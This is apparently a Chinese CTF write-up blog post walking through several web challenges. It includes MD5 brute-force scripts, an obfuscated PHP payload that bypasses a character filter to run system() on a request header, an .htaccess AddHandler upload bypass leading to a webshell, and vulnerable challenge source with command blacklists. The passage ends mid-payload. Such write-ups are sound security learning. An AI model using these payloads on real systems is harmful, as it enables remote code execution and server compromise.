    <updated>2020-12-30T13:47:13.319Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a><em>WEB</em></h2><h3 id="EZ-JS"><a href="#EZ-JS" class="headerlink" title="EZ_JS"></a>EZ_JS</h3><p><img src="https://i.loli.net/2020/12/24/JOxnP3EmolT1ZD2.png" alt="image-20201224123233716"></p><p><img src="https://i.loli.net/2020/12/24/bkfDQEdh4cHraju.png" alt="image-20201224123259063"></p><p>这里有个好用的颜码解码网站：<a href="https://www.qtool.net/decode">https://www.qtool.net/decode</a></p><a id="more"></a><h3 id="EZ-RCE"><a href="#EZ-RCE" class="headerlink" title="EZ_RCE"></a>EZ_RCE</h3><p>爆破md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000000000000000000</span>):</span><br><span class="line">    i=str(i)</span><br><span class="line">    h=hashlib.md5()</span><br><span class="line">    h.update(i.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    a = h.hexdigest()</span><br><span class="line">    <span class="keyword">if</span>( a[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&quot;7b6db2&quot;</span> ):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"> //<span class="number">2708999</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (substr(md5($_GET[<span class="string">&#x27;pass&#x27;</span>]), <span class="number">0</span>, <span class="number">6</span>) === <span class="string">&quot;7b6db2&quot;</span>) &#123;</span><br><span class="line">        $str = $_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">        $butaixing = [<span class="string">&#x27;[a-z]&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>, <span class="string">&#x27;[\x7f-\xff]&#x27;</span>, <span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;\s&#x27;</span>, <span class="string">&#x27;*&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>, <span class="string">&#x27;\$&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;\^&#x27;</span>, <span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>];</span><br><span class="line">        <span class="comment">// 没过滤 () . ? 数字 &#123;&#125;  / @ -  _</span></span><br><span class="line">        <span class="keyword">foreach</span> ($butaixing <span class="keyword">as</span> $item) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $item . <span class="string">&#x27;/im&#x27;</span>, $str)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;臭弟弟，你想干啥？&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span> . $str . <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这题是 改的RCTF的一题 , 利用一些神奇的操作获得字母</p></blockquote><p>直接给出payload，后期单独总结</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># system(end(getallheaders()))</span><br><span class="line">code &#x3D; ((((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D)).(((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D)))(((((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D)).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))))(((((((1%2F0).(0))%7B0%7D)%7C(((1.1).(0))%7B1%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26(((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D)))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D))%26((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26(((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D)))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))))()))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST &#x2F;?pass&#x3D;2708999 HTTP&#x2F;1.1</span><br><span class="line">Host: 219.219.61.234:50001</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko&#x2F;20100101 Firefox&#x2F;46.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Cookie: PHPSESSID&#x3D;u6qctifmhonae5lp6h3n1e51ot</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 2106</span><br><span class="line">a: cat &#x2F;tmp&#x2F;flag_is_here</span><br><span class="line"></span><br><span class="line">code&#x3D;((((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D)).(((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D)))(((((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D)).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))))(((((((1%2F0).(0))%7B0%7D)%7C(((1.1).(0))%7B1%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26(((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D)))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D))%26((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26(((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D)))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))))()))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/24/gkUB4tPzeCioVv7.png" alt="image-20201224192839797"></p><p><img src="https://i.loli.net/2020/12/24/SsHDxGWBlfgIVuL.png" alt="image-20201224193041277"></p><h3 id="EZ-upload"><a href="#EZ-upload" class="headerlink" title="EZ_upload"></a>EZ_upload</h3><p>扫描目录</p><p><img src="https://i.loli.net/2020/12/24/XJYx8NE9c2OyiGw.png" alt="image-20201224201258096"></p><p>访问可访问的目录</p><p><img src="https://i.loli.net/2020/12/24/4weYqknSfE2m5Bz.png" alt="image-20201224201355301"></p><p>hinit_1</p><p><img src="https://i.loli.net/2020/12/25/S3kCDtJu2KMqgIQ.png" alt="image-20201225143656131"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hint_2  源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Missing something&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$content = $_POST[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">$filename = $_POST[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_string($content) || strlen($content) &gt; <span class="number">125</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;content is too long!!!&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!is_string($filename) || strlen($filename) &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;filename is too long!!!&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">31</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($i !== <span class="number">10</span> &amp;&amp; stristr($content, chr($i))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;only visible character &quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">127</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stristr($content, chr($i))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;only visible character &quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$content_blacklist = <span class="keyword">array</span>(<span class="string">&quot;session&quot;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&quot;html&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;upload&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;prepend&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;error&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;zend&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;pcre&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;#&quot;</span>, <span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span> );</span><br><span class="line"><span class="keyword">foreach</span> ($content_blacklist <span class="keyword">as</span> $keywords) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stristr($content, $keywords)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename_blacklist = <span class="keyword">array</span>(<span class="string">&quot;ph&quot;</span>, <span class="string">&quot;ini&quot;</span>,<span class="string">&#x27;pl&#x27;</span>,<span class="string">&#x27;perl&#x27;</span>,<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;py&quot;</span>);</span><br><span class="line">$append_string = <span class="string">&quot;ohohohohohohohohoh!&quot;</span>;</span><br><span class="line">$yourdir = md5($_COOKIE[<span class="string">&#x27;PHPSESSID&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span> ($filename_blacklist <span class="keyword">as</span> $file_keys) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stristr($filename, $file_keys)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!is_dir($yourdir)) &#123;</span><br><span class="line">    @mkdir($yourdir);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    file_put_contents($yourdir . <span class="string">&#x27;/&#x27;</span> . $filename, $content . $append_string);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;file&#x27;s path:  /var/www/html/&quot;</span>.$yourdir . <span class="string">&#x27;/&#x27;</span> . $filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"> <span class="comment">// 过滤了AddType  setHandler  </span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">上传 .htaccess</span><br><span class="line">AddHandler application&#x2F;x-httpd-php .aa .&quot;&quot; 123</span><br><span class="line">&#x2F;&#x2F;AddHandler 居然还能这么用……  涨知识</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &quot;&quot; 可以起到注释作用</span><br><span class="line">然后使用短标签，传入后缀为.aa的文件，并且使用注释 &#x2F;&#x2F; </span><br></pre></td></tr></table></figure><p>菜刀连接</p><p><img src="https://i.loli.net/2020/12/30/Hce1lVCbvQZTKfo.png" alt="image-20201230205613400"></p><h3 id="EZ-pickle"><a href="#EZ-pickle" class="headerlink" title="EZ_pickle"></a>EZ_pickle</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, escape, request </span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io </span><br><span class="line"><span class="keyword">import</span> module_flag </span><br><span class="line">beifen=module_flag.sys.modules </span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span> </span><br><span class="line">        blackList =[<span class="string">&quot;system&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;global&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;pickle&quot;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;Flask&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;io&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;command&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>,<span class="string">&#x27;modules&#x27;</span>] </span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> blackList:</span><br><span class="line">            <span class="keyword">if</span> b <span class="keyword">in</span> module <span class="keyword">or</span> b <span class="keyword">in</span> name: </span><br><span class="line">                <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name)) </span><br><span class="line">                <span class="keyword">if</span> module == <span class="string">&#x27;module_flag&#x27;</span> <span class="keyword">and</span> (name[:<span class="number">1</span>] != <span class="string">&#x27;_&#x27;</span>): </span><br><span class="line">                    <span class="keyword">return</span> getattr(module_flag.sys.modules[<span class="string">&#x27;module_flag&#x27;</span>], name) <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name)) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span> </span><br><span class="line">        res = RestrictedUnpickler(io.BytesIO(s)).load() </span><br><span class="line">        print(module_flag.sys.modules) </span><br><span class="line">        module_flag.sys.modules = beifen </span><br><span class="line">        print(module_flag.sys.modules) </span><br><span class="line">        <span class="keyword">return</span> str(res) </span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;view source /src&#x27;</span> </span><br><span class="line"><span class="meta">@app.route(&#x27;/src&#x27;) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">src</span>():</span> </span><br><span class="line">        file = open(<span class="string">&quot;/src/app.py&quot;</span>).read() </span><br><span class="line">        <span class="keyword">return</span> file </span><br><span class="line"><span class="meta">@app.route(&#x27;/pickle&#x27;) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NoVulnPickle</span>():</span> </span><br><span class="line">        <span class="keyword">try</span>: </span><br><span class="line">            //代码偶尔能访问，逻辑错误，只过滤了system</span><br><span class="line">            p = request.args.get(<span class="string">&quot;pickle&quot;</span>) </span><br><span class="line">            blackList = [<span class="string">&quot;system&quot;</span> ,<span class="string">&quot;os&quot;</span> ,<span class="string">&quot;popen&quot;</span> , <span class="string">&quot;pickle&quot;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;Flask&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;io&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;command&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>,<span class="string">&#x27;modules&#x27;</span>,<span class="string">&#x27;global&#x27;</span>] </span><br><span class="line">         <span class="keyword">for</span> b <span class="keyword">in</span> blackList: </span><br><span class="line">            <span class="keyword">if</span> b <span class="keyword">in</span> p: </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;hacker!&quot;</span> </span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line">                p = p.encode() </span><br><span class="line">                <span class="comment"># print(p) </span></span><br><span class="line">          <span class="keyword">return</span> restricted_loads(p) </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;failed&#x27;</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">app.run(debug=<span class="literal">False</span>,host = <span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="string">&#x27;5000&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>看完代码，一脸懵逼，这题不会，寒假学习:anger: （寒假没了）</p></blockquote><h3 id="EZ-flask"><a href="#EZ-flask" class="headerlink" title="EZ_flask"></a>EZ_flask</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;爆破md5</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(100000000):</span><br><span class="line">    i&#x3D;str(i)</span><br><span class="line">    h&#x3D;hashlib.md5()</span><br><span class="line">    h.update(i.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">    a &#x3D; h.hexdigest()</span><br><span class="line">    if( a[0:5] &#x3D;&#x3D; &quot;52491&quot; ):</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br><span class="line">     &#x2F;&#x2F; 具体md5值按实际情况更改</span><br></pre></td></tr></table></figure><p>测试发现题目中 <code>&#123;</code> 和 <code>&#125;</code>  不能同时在一起 ，用户名和后面的参数我们可控，所以分开构造<code>&#123;&#125;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; uasename&#x3D;&#123;&#123;&quot; </span><br><span class="line">session:eyJoYXNoMSI6ImU0ODZhIiwicGFzc3dvcmQiOiIxODkxMzEwIiwic3RhdHVzIjoxLCJ1c2VybmFtZSI6Int7XCIifQ.X-YGjg.2-hzaxNZJk0O-889uMo3wnxMBkE</span><br></pre></td></tr></table></figure><p>这里先直接贴出payload；考试后去学习</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 